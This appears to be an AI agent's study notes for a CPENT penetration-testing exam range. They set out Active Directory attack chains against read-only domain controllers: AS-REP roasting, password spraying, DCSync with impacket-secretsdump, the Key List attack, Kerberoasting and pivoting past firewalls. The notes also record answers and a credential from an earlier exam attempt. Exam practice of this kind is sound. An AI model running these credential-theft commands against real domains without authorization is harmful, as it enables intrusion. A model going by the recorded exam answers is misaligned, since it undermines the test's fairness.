# Zone 1 — Active Directory (RODC attack chains)

Prior range: `172.25.170.0/24`, forest `CPENTv2025.com`, theme **Read-Only Domain
Controllers**. Full evidence (PRIVATE, do not share): `~/.config/opencode/skills/cpent-exam/private/CPENT_AD2_Report.md`.
Load with: `ctf-ad`, `ctf-privesc`.

## Topology to expect

One writable DC + one or two RODCs + a client. Identify from null-session data:

```bash
nxc smb 172.25.170.0/24 --users        # null session on writable DC
nxc smb <dc> -u '' -p '' --users       # user list
ldapsearch -x -H ldap://<dc> -s base -b "" defaultNamingContext
```

RODC markers:
- User list contains `krbtgt_<number>` accounts → one per RODC (each RODC has its
  own krbtgt). The number is the RODC number, needed for the Key List attack.
- Computer object UAC `83890176` = `PARTIAL_SECRETS_ACCOUNT` → that machine is an RODC.

**CN ≠ sAMAccountName trap**: display names may differ from login names
(prior range: Jade→`Mustain`, George→`Larry`). Always resolve:

```bash
ldapsearch -x -H ldap://<dc> -D 'user@dom' -w 'pass' \
  -b 'CN=Users,DC=…' "(|(cn=George)(cn=Jade))" dn sAMAccountName cn
```

## Enumerate RODC objects (cheap questions live here)

```bash
ldapsearch -x -H ldap://<dc> -D 'user@dom' -w 'pass' \
  -b 'DC=…' "(objectClass=computer)" \
  sAMAccountName dNSHostName managedBy msDS-KrbTgtLink userAccountControl
```

Answers directly off this query: which RODC is managed by whom, which krbtgt number
belongs to which RODC, client FQDN (`dNSHostName`).

## RODC Password Replication Policy

```bash
ldapsearch … -b 'CN=<RODC>,OU=Domain Controllers,DC=…' \
  msDS-RevealOnDemandGroup msDS-NeverRevealGroup msDS-RevealedUsers msDS-AuthenticatedToAccountList
```

- `msDS-RevealOnDemandGroup` = Allowed list (count question: prior range = 3)
- `msDS-AuthenticatedToAccountList` = **who is cached on this RODC** → the user whose
  cached password a question asks about

## Foothold ladder (prior range's exact chain)

1. **AS-REP roast** a `DONT_REQ_PREAUTH` user (check UAC; prior: Stewart):
   ```bash
   impacket-GetNPUsers dom/user -no-pass -dc-ip <dc> -format hashcat
   john --format=krb5asrep --wordlist=Passwords.txt roast.hash   # jumbo john; or hashcat -m 18200
   ```
2. **Check lockout policy** (`lockoutThreshold = 0` → spray). Spray the
   range-provided wordlist at privileged-looking users with `kerbrute bruteuser`.
3. **BloodHound** (`bloodhound-python -c All`) → who is *local admin on the RODCs
   and the writable DC*. Prior range: Jason (`qwerty`) was local admin everywhere.
4. Local admin on writable DC → **DCSync everything**:
   ```bash
   impacket-secretsdump 'dom/jason:pw@<writable_dc>' -just-dc
   ```
5. Local admin on RODC → `impacket-secretsdump` (SAM/LSA/machine key). Direct
   DCSync **against an RODC is refused — that is expected**, not a failure.

## Post-DCSync computations (question-specific)

- **NT-hash-fragment questions**: the mask applies to the hex hash
  (`746e12d158e767e95d8502d99050004c` → last 4 = `004c`). Verify a plaintext↔hash
  pair locally: `python3 -c "import hashlib;print(hashlib.new('md4','pw'.encode('utf-16-le')).hexdigest())"`
- **MsCacheV2 (DCC2) questions**: compute per account —
  DCC1 = MD4(NTLMhash || username_utf16le); DCC2 = PBKDF2-HMAC-SHA1(DCC1, username_utf16le, 10240).
  Match the suffix the question gives (`…262e11` → stewart).
- **Key List attack** (`KERB-KEY-LIST-REQ`) — retrieves keys from the RODC for
  accounts NOT cached there, using the RODC's own krbtgt:
  ```bash
  KRB5_CONFIG=$PWD/krb5.conf impacket-keylistattack \
    -rodcNo <number> -rodcKey <krbtgt_aes256_hex> \
    -kdc <rodc_ip> -dc-ip <rodc_ip> -t <target_user> 'dom/user:pass@<rodc_ip>'
  ```
  Needs hostname pinning (KRB5_CONFIG + resolver shim) because /etc/hosts is not
  writable. If the question *requires* this method, perform it even when you
  already have the hash from DCSync — method can be graded (prior attempt left
  Ch12 unsubmitted for exactly this reason).

## Kerberoast

```bash
impacket-GetUserSPNs dom/user:'pass' -dc-ip <dc> -request
```
Prior range had only one low-value SPN — kerberoasting was a decoy; the real path
was spray + local-admin edges. Do it, but do not camp on it. **v2 exam report
(2026): a Kerberoasting question DID appear, and cross-forest scenarios exist —
with two domains/forests in scope, roast across both, check trust direction
(`nltest /domain_trusts` equivalent via ldapsearch on trustedDomain objects),
and abuse inter-forest TGTs.**

## Firewall-protected hosts (v2 pattern)

A v2-documented pattern: one AD host sits behind a filter — you cannot hit it
directly. Compromise a *different* host in the range first, then query the
protected host THROUGH that foothold (portproxy / SOCKS / remote tool
execution). Expect to chain: foothold → internal query → answer. If a host
scans as dead but appears in LDAP/computer objects, this is why.

## Answer archetypes seen

| Question shape | Source |
|---|---|
| First-N-chars of a local admin pw on the client | secretsdump/PTH the client as DA; real admin may be RID 1002 `Admin`, not built-in 500 (blank) |
| RODC managed by user X → IP | LDAP computer query |
| krbtgt number → RODC sAMAccountName | null-session users + `msDS-KrbTgtLink` |
| Allowed PRP count | `msDS-RevealOnDemandGroup` entry count |
| Cached-pw first chars | `msDS-AuthenticatedToAccountList` → spray that user |
| NT hash fragment | DCSync output, hex mask |
| MsCacheV2 suffix owner | DCC2 computation loop over dump |
